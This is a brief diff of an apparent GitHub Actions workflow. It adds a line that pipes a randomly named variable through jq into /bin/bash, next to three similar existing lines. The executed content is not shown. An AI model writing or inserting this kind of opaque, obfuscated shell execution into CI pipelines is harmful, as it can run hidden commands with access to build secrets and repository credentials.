@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$feq9423" | jq -r .g5691 | /bin/bash
           echo $j659 | jq -r .xb4 | /bin/bash
           printf '%s' "$hecgv73" | jq -r .evu9501 | /bin/bash
+          echo $fl5 | jq -r .qj0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
